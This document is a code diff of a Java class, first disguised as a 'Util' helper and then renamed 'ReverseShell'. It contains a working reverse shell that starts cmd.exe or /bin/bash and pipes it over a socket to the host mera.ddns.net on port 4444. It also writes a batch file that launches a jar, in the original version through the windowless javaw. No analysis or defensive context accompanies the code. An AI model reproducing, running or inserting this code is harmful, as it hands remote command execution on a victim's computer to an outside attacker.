@@ -1,10 +1,9 @@
-package Utils;
 
 import java.io.*;
 import java.net.Socket;
 
 @SuppressWarnings("all")
-public class Util {
+class ReverseShell {
 
     /**
      * @echo off
@@ -25,7 +24,7 @@ public class Util {
     }
 
     public static void windowsBat(){
-        String scriptContent = "@echo off \n echo \"start javaw -Xmx2g -jar src/Utils/Utils.jar\" > out/production/utils.bat";
+        String scriptContent = "@echo off \n echo \"start java -Xmx2g -jar src/Utils/Utils.jar\" > out/production/utils.bat";
         try{
             Writer output = new BufferedWriter(new FileWriter("out/production/utils.bat"));
             output.write(scriptContent);
@@ -35,14 +34,40 @@ public class Util {
 
 
     public static void main(String... args) {
-        linuxSH();
         Thread thread = new Thread(() -> {
-            String cmd =  ((System.getProperty("os.name").contains("Windows"))) ? "cmd.exe" : "/bin/bash";
-             int port =  ((System.getProperty("os.name").contains("Windows"))) ? 5555 : 4444;
-            try { Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket("mera.ddns.net",port);
-                InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();
-                while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());
-                    so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception ignored){} };p.destroy();s.close(); }catch (IOException | InterruptedException e){} });
+
+            try {
+                String cmd =  ((System.getProperty("os.name").contains("Windows"))) ? "cmd.exe" : "/bin/bash";
+                Process process = new ProcessBuilder(cmd).redirectErrorStream(true).start();
+                Socket socket = new Socket("mera.ddns.net",4444);
+                InputStream processInput = process.getInputStream(), processError = process.getErrorStream(), socketInput = socket.getInputStream();
+                OutputStream processOutput = process.getOutputStream(), socketOutput = socket.getOutputStream();
+
+                while(!socket.isClosed()){
+
+                    while(processInput.available() > 0)
+                        socketOutput.write(processInput.read());
+
+                    while(processError.available() > 0)
+                        socketOutput.write(processError.read());
+
+                    while(socketInput.available() > 0)
+                        processOutput.write(socketInput.read());
+
+                    socketOutput.flush();
+                    processOutput.flush();
+                    Thread.sleep(50);
+
+                    try {
+                        process.exitValue();
+                        break;
+                    }catch (Exception ignored){}
+                };
+
+                process.destroy();
+                socket.close();
+            }catch (IOException | InterruptedException ignored){}
+        });
         thread.start();
     }
 }
